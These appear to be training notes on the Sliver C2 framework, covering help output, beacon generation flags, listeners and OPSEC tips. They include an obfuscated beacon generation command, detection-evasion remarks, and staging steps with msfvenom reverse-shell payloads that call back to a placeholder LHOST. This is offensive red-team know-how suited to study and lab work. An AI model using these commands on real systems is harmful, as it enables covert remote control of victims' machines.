- Start `sliver-server`
- Help options
```bash
[server] sliver > help

Commands:
=========
  clear       clear the screen
  exit        exit the shell
  help        use 'help [command]' for command help
  monitor     Monitor threat intel platforms for Sliver implants
  wg-config   Generate a new WireGuard client config
  wg-portfwd  List ports forwarded by the WireGuard tun interface
  wg-socks    List socks servers listening on the WireGuard tun interface


Generic:
========
  aliases           List current aliases
  armory            Automatically download and install extensions/aliases
  background        Background an active session
  beacons           Manage beacons
  builders          List external builders
  canaries          List previously generated canaries
  cursed            Chrome/electron post-exploitation tool kit (∩｀-´)⊃━☆ﾟ.*･｡ﾟ
  dns               Start a DNS listener
  generate          Generate an implant binary
  hosts             Manage the database of hosts
  http              Start an HTTP listener
  https             Start an HTTPS listener
  implants          List implant builds
  jobs              Job control
  licenses          Open source licenses
  loot              Manage the server's loot store
  mtls              Start an mTLS listener
  prelude-operator  Manage connection to Prelude's Operator
  profiles          List existing profiles
  reaction          Manage automatic reactions to events
  regenerate        Regenerate an implant
  sessions          Session management
  settings          Manage client settings
  stage-listener    Start a stager listener
  tasks             Beacon task management
  update            Check for updates
  use               Switch the active session or beacon
  version           Display version information
  websites          Host static content (used with HTTP C2)
  wg                Start a WireGuard listener


Multiplayer:
============
  kick-operator  Kick an operator from the server
  multiplayer    Enable multiplayer mode
  new-operator   Create a new operator config file
  operators      Manage operators


For even more information, please see our wiki: https://github.com/BishopFox/sliver/wiki

```
#### Operator profile

Sliver can differentiate who can connect based on the generated profile from its server. A profile can be generated using the `new-operator` command followed by the operator's name (`-n`) and the listening host IP address (`-l`).

## Armory

The previous section introduced us to the [armory](https://github.com/sliverarmory) portion of `Sliver`. Its capability of having pre-installed .NET binaries ready to be used makes the operators' lives easier. However, one of the drawbacks that one might stumble upon is the detection of the tools. In the future, we may need to think of a way to change the internals of the tools to avoid being detected.

## Beacon vs Session

- beacon responds at fixed intervals
- sessions are interactive
- a beacon can be turned into a session

#### Generating a beacon

```
[server] sliver > generate beacon --help

Generate a beacon binary

Usage:
======
  beacon [flags]

Flags:
======
  -a, --arch               string    cpu architecture (default: amd64)
  -c, --canary             string    canary domain(s)
  -D, --days               int       beacon interval days (default: 0)
  -d, --debug                        enable debug features
  -O, --debug-file         string    path to debug output
  -G, --disable-sgn                  disable shikata ga nai shellcode encoder
  -n, --dns                string    dns connection strings
  -e, --evasion                      enable evasion features  (e.g. overwrite user space hooks)
  -E, --external-builder             use an external builder
  -f, --format             string    Specifies the output formats, valid values are: 'exe', 'shared' (for dynamic libraries), 'service' (see `psexec` for more info) and 'shellcode' (windows only) (default: exe)
  -h, --help                         display help
  -H, --hours              int       beacon interval hours (default: 0)
  -b, --http               string    http(s) connection strings
  -J, --jitter             int       beacon interval jitter in seconds (default: 30)
  -X, --key-exchange       int       wg key-exchange port (default: 1337)
  -w, --limit-datetime     string    limit execution to before datetime
  -x, --limit-domainjoined           limit execution to domain joined machines
  -F, --limit-fileexists   string    limit execution to hosts with this file in the filesystem
  -z, --limit-hostname     string    limit execution to specified hostname
  -L, --limit-locale       string    limit execution to hosts that match this locale
  -y, --limit-username     string    limit execution to specified username
  -k, --max-errors         int       max number of connection errors (default: 1000)
  -M, --minutes            int       beacon interval minutes (default: 0)
  -m, --mtls               string    mtls connection strings
  -N, --name               string    agent name
  -p, --named-pipe         string    named-pipe connection strings
  -o, --os                 string    operating system (default: windows)
  -P, --poll-timeout       int       long poll request timeout (default: 360)
  -j, --reconnect          int       attempt to reconnect every n second(s) (default: 60)
  -R, --run-at-load                  run the implant entrypoint from DllMain/Constructor (shared library only)
  -s, --save               string    directory/file to the binary to
  -S, --seconds            int       beacon interval seconds (default: 60)
  -l, --skip-symbols                 skip symbol obfuscation
  -Z, --strategy           string    specify a connection strategy (r = random, rd = random domain, s = sequential)
  -T, --tcp-comms          int       wg c2 comms port (default: 8888)
  -i, --tcp-pivot          string    tcp-pivot connection strings
  -I, --template           string    implant code template (default: sliver)
  -t, --timeout            int       command timeout in seconds (default: 60)
  -g, --wg                 string    wg connection strings

```

- `-J, --jitter` configures the jitter time of the callback so that the implant will fluctuate based on the value
- `-S, --seconds` sets the time interval of the callback
- beacon modes are `mTLS, HTTP(s), DNS, named pipes, or tcp pivots`
- `--skip-symbols` disables symbol obfuscation

##### Example of generating an obfuscated beacon
```shell-session
generate beacon --http 127.0.0.1 -N http_beacon_obfuscated --os windows
```

#### Listeners
- connect the implant to the C2 server

#### Opsec Note

Though the C2 traffic of Sliver looks legitimate, using HTTPS, MTLS, or WireGuard listeners to establish a more secure channel adds a layer of protection. For the HTTP(S) listener, we can make some modifications to the C2 profile file `~/.sliver/config/http-c2.json`, such as adding a legitimate request or response headers and changing filenames and extensions in URL generation. We can refer to the Sliver wiki to understand the profile file [HTTP(s) under the hood](https://sliver.sh/docs?name=HTTPS+C2).

It is valuable to remember that when interacting with sessions in `Sliver`, the names are usually `RED`, and the beacon ones are in `BLUE`. Knowing that difference can be helpful as the sessions are interactive, and the beacons are not, as mentioned in the previous sections.

### Execute and Execute-Assembly
- both with spawn child processes 

## Privilege Escalation

- https://sliver.sh/docs?name=Aliases+and+Extensions
- Alias is a wrapper around sideload (load and execute a shared library in memory)
- Extensions are artifacts of native code loaded by the implant and passed specific callbacks to return data to the C2 server

- *OPSEC Note: By default, execute-assembly will start a sacrificial process (notepad.exe); this can be changed using the --process and specifying the process.*

## Stager steps

1. start a listener
```bash
mtls -l <port1>
```

2. configure a profile
```bash
profile new --mtls ip:port1 -l -f <option like shellcode> <profile name>
profile new beacon --mtls ip:port1 -f -f <option> <profile name>
```

3. configure stage listeners
```bash
stage-listener -u http://LHOST:<port2> -p <profile name>
stage-listener -u tcp://LHOST:<port3> -p <profile name>
```

4. example payloads with msfvenom 
```bash
msfvenom -p windows/x64/custom/reverse_tcp lhost=LHOST lport=<port3> -f exe -o tcp.exe 
msfvenom -p windows/x64/custom/reverse_winhttp lhost=LHOST lport=<port2> LURI=/path.woff -f exe -o http.exe
```

